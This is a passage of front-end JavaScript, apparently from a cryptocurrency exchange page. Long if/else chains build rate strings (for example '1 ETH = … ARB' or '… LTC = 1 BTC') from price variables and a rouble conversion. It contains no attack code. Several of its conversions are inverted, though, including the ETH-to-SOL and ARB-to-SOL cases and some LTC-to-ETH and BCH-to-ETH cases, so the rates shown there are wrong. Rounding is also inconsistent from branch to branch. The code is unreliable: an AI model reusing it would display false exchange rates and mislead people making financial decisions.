                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_POL) ) } POL = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers( (Number(PRICE_POL) / Number(PRICE_ARB)).toFixed(5) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_POL) ) } POL = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_POL) ) } POL = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers( (Number(PRICE_POL) / Number(PRICE_XRP)).toFixed(5) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers( (Number(PRICE_POL) / Number(PRICE_DOGE)).toFixed(5) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_POL) ) } POL = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers( (Number(PRICE_POL) / Number(PRICE_XLM)).toFixed(5) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers( (Number(PRICE_POL) / Number(PRICE_TRX)).toFixed(5) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers( (Number(PRICE_POL) / Number(PRICE_TON)).toFixed(5) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${((Number(PRICE_POL) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${((Number(PRICE_POL) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${((Number(PRICE_POL) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${((Number(PRICE_POL) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    }

                } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers((PRICE_ETH * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_ETH) ) } ETH = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_DOT) ) } DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_SOL) ) } ETH = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_ETH) ) } ETH = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( (Number(PRICE_ETH) / Number(PRICE_ARB)).toFixed(2) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_ETH) ) } ETH = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_ETH) ) } ETH = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( (Number(PRICE_ETH) / Number(PRICE_XRP)).toFixed(2) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( (Number(PRICE_ETH) / Number(PRICE_DOGE)).toFixed(2) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( (Number(PRICE_ETH) / Number(PRICE_ETC)).toFixed(2) ) } ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( (Number(PRICE_ETH) / Number(PRICE_XLM)).toFixed(2) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( (Number(PRICE_ETH) / Number(PRICE_TRX)).toFixed(2) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${ addedSpacesInNumbers( (Number(PRICE_ETH) / Number(PRICE_TON)).toFixed(2) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${addedSpacesInNumbers((Number(PRICE_ETH) / Number(PRICE_DASH)).toFixed(2))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${addedSpacesInNumbers((Number(PRICE_ETH) / Number(PRICE_ZEC)).toFixed(2))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${addedSpacesInNumbers((Number(PRICE_ETH) / Number(PRICE_BNB)).toFixed(2))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 ETH = ${addedSpacesInNumbers((Number(PRICE_ETH) / Number(PRICE_XMR)).toFixed(2))} XMR`;
                    }

                } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers((PRICE_ARB * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_ARB) ) } ARB = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( Number(PRICE_ARB) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( Number(PRICE_ARB) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( Number(PRICE_ARB) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( Number(PRICE_ARB) / Number(PRICE_DOT) ) } DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ARB) / Number(PRICE_SOL) ) } ARB = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( Number(PRICE_ARB) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ARB) / Number(PRICE_ETH) ) } ARB = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( (Number(PRICE_ARB) / Number(PRICE_ARB)).toFixed(2) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_ARB) ) } ARB = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_ARB) ) } ARB = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( (Number(PRICE_ARB) / Number(PRICE_XRP)).toFixed(2) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( (Number(PRICE_ARB) / Number(PRICE_DOGE)).toFixed(2) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( (Number(PRICE_ARB) / Number(PRICE_ETC)).toFixed(2) ) } ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( (Number(PRICE_ARB) / Number(PRICE_XLM)).toFixed(2) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( (Number(PRICE_ARB) / Number(PRICE_TRX)).toFixed(2) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${ addedSpacesInNumbers( (Number(PRICE_ARB) / Number(PRICE_TON)).toFixed(2) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${((Number(PRICE_ARB) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${((Number(PRICE_ARB) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${((Number(PRICE_ARB) / Number(PRICE_BNB)).toFixed(2))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 ARB = ${((Number(PRICE_ARB) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    }

                } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers((PRICE_LTC * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_LTC) ) } LTC = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_DOT) ) } DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_SOL) ) } LTC = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_ETH) ) } LTC = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( (Number(PRICE_LTC) / Number(PRICE_ARB)).toFixed(2) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_LTC) ) } LTC = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_LTC) ) } LTC = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( (Number(PRICE_LTC) / Number(PRICE_XRP)).toFixed(2) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( (Number(PRICE_LTC) / Number(PRICE_DOGE)).toFixed(2) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( (Number(PRICE_LTC) / Number(PRICE_ETC)).toFixed(2) ) } ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( (Number(PRICE_LTC) / Number(PRICE_XLM)).toFixed(2) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( (Number(PRICE_LTC) / Number(PRICE_TRX)).toFixed(2) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${ addedSpacesInNumbers( (Number(PRICE_LTC) / Number(PRICE_TON)).toFixed(2) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${addedSpacesInNumbers((Number(PRICE_LTC) / Number(PRICE_DASH)).toFixed(2))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${addedSpacesInNumbers((Number(PRICE_LTC) / Number(PRICE_ZEC)).toFixed(2))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${addedSpacesInNumbers((Number(PRICE_LTC) / Number(PRICE_BNB)).toFixed(2))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 LTC = ${addedSpacesInNumbers((Number(PRICE_LTC) / Number(PRICE_XMR)).toFixed(2))} XMR`;
                    }

                } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers((PRICE_BCH * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_BCH) ) } BCH = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_DOT) ) } DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_SOL) ) } BCH = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_ETH) ) } BCH = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( (Number(PRICE_BCH) / Number(PRICE_ARB)).toFixed(2) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_LTC) ) } BCH = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_BCH) ) } BCH = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( (Number(PRICE_BCH) / Number(PRICE_XRP)).toFixed(2) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( (Number(PRICE_BCH) / Number(PRICE_DOGE)).toFixed(2) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( (Number(PRICE_BCH) / Number(PRICE_ETC)).toFixed(2) ) } ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( (Number(PRICE_BCH) / Number(PRICE_XLM)).toFixed(2) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( (Number(PRICE_BCH) / Number(PRICE_TRX)).toFixed(2) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${ addedSpacesInNumbers( (Number(PRICE_BCH) / Number(PRICE_TON)).toFixed(2) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${addedSpacesInNumbers((Number(PRICE_BCH) / Number(PRICE_DASH)).toFixed(2))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${addedSpacesInNumbers((Number(PRICE_BCH) / Number(PRICE_ZEC)).toFixed(2))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${addedSpacesInNumbers((Number(PRICE_BCH) / Number(PRICE_BNB)).toFixed(2))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 BCH = ${addedSpacesInNumbers((Number(PRICE_BCH) / Number(PRICE_XMR)).toFixed(2))} XMR`;
                    }

                } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers((PRICE_XRP * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_XRP) ) } XRP = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers( Number(PRICE_XRP) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers( Number(PRICE_XRP) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers( Number(PRICE_XRP) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_XRP) ) } XRP = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_XRP) ) } XRP = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers( Number(PRICE_XRP) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_XRP) ) } XRP = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers( (Number(PRICE_XRP) / Number(PRICE_ARB)).toFixed(5) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_XRP) ) } XRP = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_XRP) ) } XRP = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers( (Number(PRICE_XRP) / Number(PRICE_XRP)).toFixed(5) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers( (Number(PRICE_XRP) / Number(PRICE_DOGE)).toFixed(5) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_XRP) ) } XRP = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers( (Number(PRICE_XRP) / Number(PRICE_XLM)).toFixed(5) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers( (Number(PRICE_XRP) / Number(PRICE_TRX)).toFixed(5) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${ addedSpacesInNumbers( (Number(PRICE_XRP) / Number(PRICE_TON)).toFixed(5) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${addedSpacesInNumbers((Number(PRICE_XRP) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${((Number(PRICE_XRP) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${((Number(PRICE_XRP) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 XRP = ${((Number(PRICE_XRP) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    }
                } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
